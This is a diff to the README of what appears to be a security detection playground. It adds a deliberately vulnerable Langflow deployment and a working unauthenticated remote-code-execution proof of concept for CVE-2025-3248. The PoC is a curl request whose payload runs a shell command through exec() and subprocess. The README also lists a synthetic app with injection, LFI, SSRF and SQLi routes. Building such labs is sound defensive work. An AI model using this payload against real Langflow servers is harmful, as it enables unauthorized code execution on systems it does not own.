@@ -74,9 +74,9 @@ export DD_APP_KEY=<your application key>      # only needed for scenario 1 (rce-
    datadog-agent-rzxs2                            4/4     Running   0          2m8s
    ```
 
-### Step 2: Deploy the Playground App
+### Step 2: Deploy Vulnerable Applications
 
-1. **Deploy via Helm:**
+1. **Deploy via Helm** (playground app + the `langflow-vulnerable` container, see [Vulnerable Applications](#-vulnerable-applications) below):
    ```bash
    helm install playground deploy/helm/playground --namespace playground --create-namespace
    ```
@@ -90,6 +90,7 @@ export DD_APP_KEY=<your application key>      # only needed for scenario 1 (rce-
    ```
    NAME                                           READY   STATUS              RESTARTS   AGE
    playground-app-7f8b9c6d5-2hmzx                 1/1     Running             0          1m30s
+   langflow-vulnerable-6d9c8f7b4-9k2lp             1/1     Running             0          1m30s
    ```
 
 ### Cleanup
@@ -110,6 +111,23 @@ To remove the playground from your cluster:
    ```bash
    kubectl delete secret $DATADOG_API_SECRET_NAME
    ```
+
+## 🧪 Vulnerable Applications
+
+`deploy/helm/playground` deploys two workloads into the `playground` namespace:
+
+- **`playground-app`**: the synthetic Flask app (command injection, LFI, SSRF, SQLi routes) used by the [Attack Scenarios](#-available-attack-scenarios) below.
+- **`langflow-vulnerable`**: the real, upstream [Langflow](https://github.com/langflow-ai/langflow) image pinned by digest to the last version affected by [CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248) (CVSS 9.8, CISA KEV) — an unauthenticated `exec()` on user-supplied code via `POST /api/v1/validate/code`, fixed in 1.3.0. It's scannable with the upstream [nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-3248.yaml).
+
+  PoC (no authentication required):
+  ```bash
+  kubectl port-forward -n playground deploy/langflow-vulnerable 7860:7860 &
+
+  curl -s -X POST http://localhost:7860/api/v1/validate/code \
+    -H "Content-Type: application/json" \
+    --data-binary '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output([\\\"id\\\"]))\")\ndef foo():\n  pass"}'
+  ```
+  The response reflects the `id` output (e.g. `uid=1000(user) gid=0(root)...`), proving unauthenticated RCE.
 
 ## ☁️ Terraform EKS Setup (Optional)
 
